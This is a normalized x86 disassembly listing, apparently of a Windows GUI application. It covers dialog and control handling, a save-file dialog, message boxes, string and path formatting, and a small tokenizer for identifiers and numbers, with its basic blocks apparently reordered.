call ebp
cmp eax 0x1
jne r-xdata
cmp eax 0x1
jl r-xdata
mov cl 0x1
call [ lstrcpyA@IAT ]
lea ecx [ esp + 0x170 ]
push ecx
call sub_458010
mov edx [ rw-data ]
add esp 0x4
xor cl cl
test edx edx
je r-xdata
push eax
push 0x100c
push esi
call [ SetDlgItemTextA@IAT ]
mov edx [ rw-data ]
push edx
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x0
push 0x1402
push esi
call [ PostMessageA@IAT ]
mov eax 0x1
jmp r-xdata
mov eax rw-data
push eax
push 0x0
push 0xc
push 0x480
push esi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call ebx
push 0x414
push esi
call ebp
test eax eax
jne r-xdata
mov eax rw-data
mov eax [ esp + 0x24 ]
xor ecx ecx
test eax eax
jle r-xdata
lea edx [ esp + 0x14 ]
push eax
call sub_457f40
add esp 0x4
add eax edi
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x6c ]
push ecx
lea edx [ esp + 0x14 ]
push edx
mov [ esp + eax + 0x74 ] 0x0
call sub_401380
add esp 0x8
test al al
je r-xdata
cmp [ esp + 0x28 ] 0x10
mov eax [ esp + 0x14 ]
jae r-xdata
test cl cl
je r-xdata
cmp [ esp + eax + 0x16f ] 0x5c
jne r-xdata
mov ecx [ esp + 0x378 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x374
retn 0x10
push eax
push 0x414
push 0x111
push esi
call ebx
jmp r-xdata
cmp [ esp + 0x28 ] ebp
mov eax [ esp + 0x14 ]
jae r-xdata
mov al [ ecx + edx ]
cmp al 0x80
jb r-xdata
mov eax [ esp + 0x24 ]
lea ecx [ esp + eax + 0x6d ]
push ecx
mov ecx rw-data
call sub_402510
push 0x40e
push edi
call ebp
test eax eax
jne r-xdata
push eax
push 0x0
push 0xc
push 0x480
push edi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
lea eax [ esp + 0x14 ]
jmp r-xdata
push r--data
lea edx [ esp + 0x174 ]
push edx
call [ lstrcatA@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
mov [ esp + eax + 0x170 ] 0x0
cmp eax 0x1
jl r-xdata
dec eax
mov cl 0x1
push eax
push 0x0
push 0xc
push 0x480
push esi
call [ GetParent@IAT ]
push eax
call ebx
mov edi [ SendMessageA@IAT ]
push eax
call edi
push 0x0
push 0x414
push 0x111
push esi
call edi
lea ecx [ esp + 0x10 ]
call sub_4480e0
jmp r-xdata
lea eax [ esp + 0x14 ]
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
push 0x40e
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x34 ] 0x0
mov ecx rw-data
mov [ esp + 0x380 ] 0x2
call sub_4010f0
test eax eax
jne r-xdata
cmp [ esp + eax + 0x16f ] 0x3a
jne r-xdata
cmp al 0x2f
je r-xdata
cmp al 0xff
ja r-xdata
inc ecx
jmp r-xdata
mov eax rw-data
mov ebp [ GetParent@IAT ]
lea ecx [ esp + 0x170 ]
push ecx
push 0x0
push 0xc
push 0x480
push esi
call ebp
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push 0x1
push 0x480
push esi
call ebp
push eax
call edi
push eax
call ebx
push 0x1
jmp r-xdata
lea edx [ esp + 0x6c ]
push edx
push 0x104
push 0x464
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
lea eax [ esp + 0x6c ]
push eax
mov ecx rw-data
call sub_402510
mov eax [ rw-data ]
test eax eax
mov eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
inc eax
push eax
lea ecx [ esp + 0x70 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x6c ]
push edx
jmp r-xdata
dec eax
jmp r-xdata
mov [ ecx + edx ] 0x5f
cmp al 0x5c
je r-xdata
mov eax [ esp + 0x24 ]
inc ecx
cmp ecx eax
jl r-xdata
push 0x1036
push esi
call edi
push eax
call ebx
mov [ rw-data ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
imul eax eax 0x70
add eax ecx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov edx [ rw-data ]
imul eax eax 0x70
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
mov ecx rw-data
call sub_402510
mov eax rw-data
call sub_447fd0
lea ecx [ esp + 0x30 ]
call sub_4480e0
jmp r-xdata
cmp al 0x3a
jne r-xdata
lea ebp [ eax + 0x4 ]
mov ebp [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
add eax 0x7
jmp r-xdata
mov eax [ eax + 0x4 ]
add eax 0x7
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push eax
push eax
call sub_457f40
add esp 0x4
add eax ebp
sub_44e900
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c07bd
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x3f0
push ebx
push ebp
xor ebp ebp
cmp eax ebp
push esi
push edi
je r-xdata
or eax 0xffffffff
mov esi [ rw-data ]
cmp esi ebp
mov ebx 0x10
je r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
lea edx [ esp + 0xfc ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
lea eax [ esp + 0xf8 ]
push eax
call sub_458010
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
add esp 0x4
mov [ esp + eax + 0xf8 ] 0x0
push edx
lea eax [ esp + 0xfc ]
push eax
call edi
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebp
mov [ esp + 0x1c ] 0x0
cmp [ rw-data ] ebp
mov [ esp + 0x408 ] ebp
je r-xdata
cmp [ rw-data ] ebp
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
imul ecx ecx 0x70
lea eax [ ecx + esi ]
cmp [ eax + 0x18 ] ebx
jb r-xdata
mov eax [ rw-data ]
imul eax eax 0x70
mov ecx [ eax + esi + 0x18 ]
add eax esi
cmp ecx ebx
jb r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
mov ebp [ esp + 0x410 ]
mov ebx [ GetWindowLongA@IAT ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0xac ]
[ edi ]
mov eax [ rw-data ]
push 0xfffffffa
push ebp
mov [ esp + 0xb4 ] 0x4c
mov [ esp + 0xb8 ] eax
call ebx
mov ecx [ rw-data ]
xor esi esi
inc ecx
mov [ esp + 0xb4 ] eax
mov [ esp + 0xc4 ] ecx
mov eax 0x103
lea edx [ esp + 0xf8 ]
lea ecx [ esp + 0x2fc ]
push rw-data
mov [ esp + 0xbc ] r--data
mov [ esp + 0xc0 ] esi
mov [ esp + 0xc4 ] esi
mov [ esp + 0xcc ] edx
mov [ esp + 0xd0 ] eax
mov [ esp + 0xd4 ] ecx
mov [ esp + 0xd8 ] eax
call [ lstrlenA@IAT ]
test eax eax
jne r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
push eax
lea edx [ esp + 0xfc ]
push edx
mov esi rw-data
mov eax esi
push eax
call sub_457f40
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0xfc ]
push ecx
jmp r-xdata
mov esi rw-data
mov eax esi
mov [ esp + 0xd8 ] rw-data
cmp [ rw-data ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] ebx
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
jmp r-xdata
lea edx [ eax + 0x7 ]
mov eax edx
lea esi [ eax + 0x1 ]
mov [ esp + eax + 0xf8 ] 0x0
mov al [ rw-data ]
test al al
je r-xdata
cmp [ esp + eax + 0xf7 ] 0x5c
jne r-xdata
call [ lstrcpyA@IAT ]
lea eax [ esp + 0xf8 ]
push eax
call sub_458010
add esp 0x4
cmp eax 0x1
jl r-xdata
mov eax [ esp + 0xc4 ]
lea ecx [ esp + 0xf8 ]
dec eax
push ecx
mov [ rw-data ] eax
call sub_457f40
add esp 0x4
push eax
lea edx [ esp + 0xfc ]
push edx
push rw-data
call [ lstrcpynA@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov [ esp + 0xd8 ] rw-data
jmp r-xdata
mov edx [ rw-data ]
mov [ esp + 0xd8 ] edx
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
jmp r-xdata
lea ecx [ esp + 0x20 ]
call sub_401e80
lea eax [ esp + 0x18 ]
call sub_447fd0
cmp [ esp + 0x30 ] ebx
mov eax [ esp + 0x1c ]
jae r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push r--data
lea ecx [ esp + 0xfc ]
push ecx
call edi
cmp eax 0x1
jl r-xdata
dec eax
mov ecx [ rw-data ]
cmp ecx esi
je r-xdata
sub esp 0x20
mov eax esp
mov [ esp + 0x34 ] esp
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] 0x0
push 0x1
mov ecx rw-data
mov [ eax + 0x4 ] 0x0
call sub_449740
mov esi [ rw-data ]
lea eax [ esp + 0xf8 ]
push eax
call sub_457f40
lea ecx [ esp + eax + 0xfc ]
mov eax ecx
add esp 0x4
lea edi [ eax + 0x1 ]
mov ecx rw-data
call sub_448e30
mov eax 0x1
jmp r-xdata
mov [ esp + 0x58 ] esi
mov [ esp + 0x5c ] esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x408 ] 0x1
mov [ esp + 0xa0 ] esi
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa8 ] esi
mov eax [ rw-data ]
cmp eax esi
mov [ esp + 0x408 ] 0x2
jne r-xdata
lea eax [ esp + 0xac ]
push eax
mov [ esp + 0xe0 ] r--data
mov [ esp + 0xe4 ] 0x80866
mov [ esp + 0xe8 ] si
mov [ esp + 0xea ] si
mov [ esp + 0xec ] esi
mov [ esp + 0xf0 ] esi
mov [ esp + 0xf4 ] sub_44cc00
mov [ esp + 0xf8 ] 0x82
mov [ rw-data ] esi
call [ GetSaveFileNameA@IAT ]
test eax eax
jne r-xdata
sub ecx esi
push ecx
push eax
push eax
lea edx [ esp + 0xfc ]
push edx
call [ lstrcpyA@IAT ]
cmp [ esp + 0x30 ] ebx
mov [ esp + 0x408 ] 0xffffffff
jb r-xdata
lea eax [ esp + 0x1c ]
push r--data
lea edx [ esp + 0xfc ]
push edx
call edi
cmp [ esp + eax + 0xf7 ] 0x3a
jne r-xdata
mov cl [ rw-data ]
or eax 0xffffffff
test cl cl
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
cmp eax esi
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_401e80
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ edx + 0x1c ] ecx
xor esi esi
jmp r-xdata
mov ecx [ esp + 0x400 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x3fc
retn
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov al [ rw-data ]
test al al
mov edi [ lstrcatA@IAT ]
jne r-xdata
mov eax [ esp + 0x1c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
dec eax
push eax
call sub_44a040
add esp 0x4
mov eax [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push esi
push edx
lea ecx [ esp + 0x5c ]
call sub_448e80
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] esi
mov [ esp + 0x7c ] 0x0
lea eax [ esp + 0xf8 ]
mov [ esp + 0x408 ] 0x6
lea edx [ eax + 0x1 ]
mov eax [ rw-data ]
push eax
sub esp 0x1c
lea edx [ esp + 0x118 ]
mov ecx esp
mov [ esp + 0x34 ] esp
push edx
call sub_4024d0
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
mov edi [ rw-data ]
test edi edi
mov esi [ rw-data ]
jne r-xdata
push esi
push edx
lea ecx [ esp + 0xa4 ]
call sub_448e80
mov ebx [ esp + 0x58 ]
xor ebp ebp
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xfc ]
push ecx
lea ecx [ esp + 0x80 ]
call sub_401e80
lea edx [ esp + 0x68 ]
push edx
push sub_44bcf0
push ebp
push 0xc23
push 0xfffffffa
push ebp
mov [ esp + 0xac ] 0xffffffff
mov [ esp + 0xb0 ] 0x0
call ebx
push eax
call [ DialogBoxParamA@IAT ]
mov esi eax
mov al [ esp + 0x98 ]
test al al
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx esi
sub ecx edi
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx rw-data
call sub_448e30
test esi esi
jne r-xdata
mov eax [ rw-data ]
push 0x5
push eax
call [ ShowWindow@IAT ]
push edx
call sub_44c9b0
add esp 0x24
mov ecx rw-data
call sub_448e30
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
xor ebp ebp
mov [ esp + 0x14 ] edx
mov [ rw-data ] ebp
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] ebp
mov [ esp + 0x7c ] 0x0
mov ebx [ esp + 0x58 ]
mov eax [ esp + 0xa0 ]
sub eax ebx
mov [ esp + 0x98 ] 0x0
mov [ esp + 0x34 ] eax
lea esp [ esp ]
mov [ ebx + ebp * 4 ] 0x2
inc ebp
jmp r-xdata
cmp ebp edx
jge r-xdata
cmp esi 0x1
jne r-xdata
lea ecx [ esp + 0x68 ]
call sub_448050
xor eax eax
jmp r-xdata
mov ecx esi
sub ecx edi
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push 0x0
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
lea ecx [ esp + 0x68 ]
call sub_448050
lea ecx [ esp + 0x68 ]
call sub_448050
mov eax 0x2
jmp r-xdata
xor ebp ebp
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] ebp
mov [ esp + 0x3c ] 0x0
mov ebx [ esp + 0x58 ]
mov [ esp + 0x408 ] 0x5
mov [ esp + 0x10 ] ebp
lea ebx [ ebx ]
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
push ebp
mov [ esp + 0x414 ] 0x4
call sub_449a60
mov esi [ esp + 0x1c ]
mov eax [ esi + 0x110 ]
add esp 0xc
test eax eax
jne r-xdata
cmp ebp edx
jge r-xdata
sub esi edi
mov eax 0x3e88cb3d
imul esi
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp [ esi + 0x114 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ rw-data ] eax
cmp [ esp + 0x50 ] 0x10
mov eax [ esp + 0x3c ]
jae r-xdata
mov eax [ edi + ebp ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
cmp [ esp + 0x10 ] edx
jge r-xdata
lea eax [ esi + 0x100 ]
mov eax [ esi + 0x100 ]
jmp r-xdata
mov [ esp + 0x64 ] eax
cmp [ esi + 0x360 ] 0x10
jb r-xdata
mov ecx [ esp + 0x410 ]
push 0x0
push r--data
push eax
push ecx
call [ MessageBoxA@IAT ]
mov al [ esp + 0x98 ]
test al al
je r-xdata
lea eax [ esp + 0x3c ]
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
lea edi [ esi + 0x34c ]
mov edi [ esi + 0x34c ]
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov esi [ rw-data ]
xor ebp ebp
xor edi edi
mov [ esp + 0x10 ] ebp
xor ebx ebx
mov edx [ rw-data ]
push 0x5
push edx
call [ ShowWindow@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x40 ]
call sub_401cc0
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
push esi
call sub_457f40
add esp 0x4
add esi eax
mov eax r--data
lea edx [ eax + 0x1 ]
mov edi edi
cmp [ esi + 0xf8 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0xf4 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x40 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea eax [ esi + 0xe4 ]
mov eax [ esi + 0xe4 ]
jmp r-xdata
cmp [ esi + 0x34 ] 0x10
jb r-xdata
sub esp 0x20c
mov ecx esp
mov [ esp + 0x220 ] esp
call sub_449080
mov eax [ esp + 0x21c ]
push eax
mov ecx rw-data
call sub_44c890
mov esi [ rw-data ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x58 ]
cmp [ ecx + edi * 4 ] 0x0
je r-xdata
cmp edi edx
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x40 ]
call sub_401cc0
mov eax [ ebx ]
test eax eax
jne r-xdata
lea ecx [ esi + 0x20 ]
mov ecx [ esi + 0x20 ]
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov eax [ esp + 0x50 ]
mov edi 0x10
cmp eax edi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jb r-xdata
mov edi [ rw-data ]
cmp esi edi
je r-xdata
inc edi
add ebp 0x20c
jmp r-xdata
cmp edi [ esp + 0x10 ]
je r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ esp + 0x34 ]
mov eax 0x10624dd3
mul [ ebx + ecx ]
mov ecx edx
shr ecx 0x6
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
imul eax eax 0x3c
sub ecx eax
push ecx
push edx
lea ecx [ esp + 0x204 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax r--data
add esp 0x10
lea ecx [ eax + 0x1 ]
mov edx [ rw-data ]
push 0x1
push 0x0
push 0xffffffff
push edx
call sub_485220
add esp 0x10
push 0xffffffff
push 0x0
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x84 ]
call sub_401dd0
mov eax [ esp + 0x410 ]
lea ecx [ esp + 0x68 ]
push ecx
push sub_44bcf0
push eax
push 0xc23
push 0xfffffffa
push eax
mov [ esp + 0xac ] ebp
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xfffffffe
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push 0x0
push esi
push 0x0
push edi
lea edx [ esp + 0x74 ]
push edx
push 0x1
push 0x0
push eax
mov eax [ rw-data ]
push 0xffffffff
push eax
push ecx
call sub_4863a0
add esp 0x2c
test eax eax
jge r-xdata
cmp [ esp + 0x90 ] edi
mov esi 0xf
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] 0x0
jb r-xdata
mov ecx [ esp + 0x3c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
lea esp [ esp ]
test esi esi
jne r-xdata
inc [ esp + 0x10 ]
add ebx 0x20c
lea edx [ esi + ebp ]
push edx
lea ecx [ ebx + esi ]
call sub_449c30
mov esi [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x40 ]
call sub_401cc0
lea eax [ esp + 0x1fc ]
lea edx [ eax + 0x1 ]
cmp eax 0x1
je r-xdata
mov [ ebx ] eax
call [ GetTickCount@IAT ]
mov ecx [ esp + 0x74 ]
mov edx [ esp + 0x34 ]
sub eax ecx
mov [ edx + ebx ] eax
jmp r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
inc ebp
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
add ebx 0x4
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
jmp r-xdata
mov eax [ esp + 0xa0 ]
cmp eax ebx
mov [ esp + 0x90 ] esi
mov [ esp + 0x8c ] ebx
mov [ esp + 0x7c ] 0x0
je r-xdata
mov edx [ esp + 0x7c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_4480e0
add esi 0x20
cmp esi edi
jne r-xdata
mov esi [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x200 ]
push edx
jmp r-xdata
mov ecx [ esp + 0x58 ]
mov [ ecx + ebp * 4 ] 0x2
cmp [ esp + 0x30 ] 0x10
jb r-xdata
mov [ ebx ] 0xffffffff
cmp [ esp + 0x30 ] 0x10
jb r-xdata
test edi edi
jne r-xdata
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x58 ]
cmp eax ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
jmp r-xdata
lea ecx [ esp + 0x40 ]
call sub_401cc0
mov esi [ rw-data ]
mov edi [ rw-data ]
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x1c ]
push eax
xor eax eax
jmp r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x40 ]
call sub_401cc0
mov edx [ esp + 0x10 ]
mov esi [ rw-data ]
mov edi [ rw-data ]
inc edx
add ebp 0x20c
mov [ esp + 0x10 ] edx
add ebx 0x4
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
test edi edi
jne r-xdata
sub_44f610
xor eax eax
mov edx 0x1
mov [ ecx + 0x10008 ] eax
mov [ ecx + 0x10008 ] eax
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x1000c ] eax
mov [ ecx + 0x10010 ] eax
mov [ ecx + 0x10014 ] al
mov [ ecx ] eax
mov [ ecx + 0x1001c ] eax
mov [ ecx + 0x10008 ] al
mov [ ecx + 0x10020 ] eax
mov [ ecx + 0x10024 ] dl
retn
sub_44f680
mov edx [ ecx + 0x1000c ]
mov al [ edx ]
cmp al 0x20
je r-xdata
inc edx
mov [ ecx + 0x1000c ] edx
jmp sub_44f680
cmp al 0x9
je r-xdata
cmp al 0x81
jne r-xdata
test al al
je r-xdata
cmp [ edx + 0x1 ] 0x40
jne r-xdata
mov eax [ ecx + 0x1000c ]
retn
cmp al 0xd
jne r-xdata
add edx 0x2
mov [ ecx + 0x1000c ] edx
jmp sub_44f680
cmp al 0xa
jne r-xdata
mov eax [ ecx + 0x4 ]
inc edx
inc eax
mov [ ecx + 0x10024 ] 0x1
mov [ ecx + 0x1000c ] edx
mov [ ecx + 0x4 ] eax
jmp sub_44f680
sub_44f6e0
mov ecx [ esp + 0x8 ]
mov al [ ecx ]
test al al
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ edi ]
je r-xdata
mov [ edi ] esi
pop edi
mov al 0x1
pop esi
retn 0x8
mov dl [ esi ]
inc ecx
inc esi
cmp dl al
jne r-xdata
pop edi
xor al al
pop esi
retn 0x8
mov al [ ecx ]
test al al
jne r-xdata
sub_44f710
mov ecx [ esp + 0x8 ]
mov al [ ecx ]
test al al
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ edi ]
je r-xdata
mov al [ esi ]
cmp al 0x41
jl r-xdata
mov dl [ esi ]
inc ecx
inc esi
cmp dl al
jne r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jle r-xdata
pop edi
xor al al
pop esi
retn 0x8
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x7a
jle r-xdata
mov [ edi ] esi
pop edi
mov al 0x1
pop esi
retn 0x8
cmp al 0x39
jle r-xdata
sub_44f760
mov edx [ esp + 0x4 ]
add ecx 0x8
cmp al 0x61
jb r-xdata
cmp al 0x5a
jbe r-xdata
cmp al 0x30
jb r-xdata
cmp al 0x7a
jbe r-xdata
mov [ ecx ] al
mov eax [ edx ]
inc ecx
inc eax
mov [ edx ] eax
jmp r-xdata
cmp al 0x5f
je r-xdata
cmp al 0x39
jbe r-xdata
mov eax [ edx ]
mov al [ eax ]
cmp al 0x41
jb r-xdata
cmp al 0x80
jb r-xdata
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
mov [ ecx ] 0x0
retn 0x4
cmp al 0xff
ja r-xdata
mov [ ecx ] al
mov eax [ edx ]
inc ecx
inc eax
mov [ edx ] eax
mov al [ eax ]
sub_44f7c0
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
mov esi ecx
xor ebx ebx
mov [ esi + 0x10008 ] ebx
push r--data
mov [ esi + 0x10008 ] ebx
push edi
mov [ esi + 0x10008 ] bl
call sub_44f710
test al al
jne r-xdata
mov [ esi + 0x10008 ] 0x1
push r--data
push edi
mov ecx esi
call sub_44f710
test al al
jne r-xdata
push r--data
push edi
mov ecx esi
call sub_44f710
test al al
jne r-xdata
mov [ esi + 0x10008 ] bl
jmp r-xdata
push r--data
push edi
mov ecx esi
call sub_44f710
test al al
jne r-xdata
add esi 0x8
push r--data
push esi
call [ lstrcpyA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x5
pop ebx
pop ecx
retn 0x4
mov edx [ edi ]
mov al [ edx ]
cmp al 0x2e
jne r-xdata
cmp al 0x30
jl r-xdata
mov cl [ edx + 0x1 ]
cmp cl 0x30
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x4
cmp al 0x39
jg r-xdata
cmp cl 0x39
jle r-xdata
cmp al 0x30
mov [ esp + 0x18 ] 0x3f800000
jne r-xdata
mov ebp 0xa
cmp [ edx + 0x1 ] 0x78
jne r-xdata
cmp ebx 0x4
jne r-xdata
cmp ebp 0xa
je r-xdata
lea eax [ edx + 0x2 ]
mov ebp 0x10
mov [ edi ] eax
jmp r-xdata
inc [ edi ]
jmp r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x2e
jne r-xdata
cmp ebp 0x10
jne r-xdata
mov ebx 0x3
cmp ebx 0x3
mov ecx [ edi ]
mov al [ ecx ]
jne r-xdata
mov ecx [ edi ]
sub ecx edx
inc ecx
push ecx
push edx
add esi 0x8
push esi
call [ lstrcpynA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x4
pop ebx
pop ecx
retn 0x4
cmp al 0x39
jg r-xdata
cmp al 0x30
jl r-xdata
fild [ esi + 0x10008 ]
mov ebx 0x4
fstp [ esi + 0x10008 ]
mov eax [ edi ]
inc eax
mov [ edi ] eax
jmp r-xdata
cmp al 0x30
jl r-xdata
fld [ esp + 0x18 ]
movsx eax al
fmul [ r--data ]
sub eax 0x30
mov [ esp + 0x10 ] eax
fstp [ esp + 0x18 ]
fild [ esp + 0x10 ]
fmul [ esp + 0x18 ]
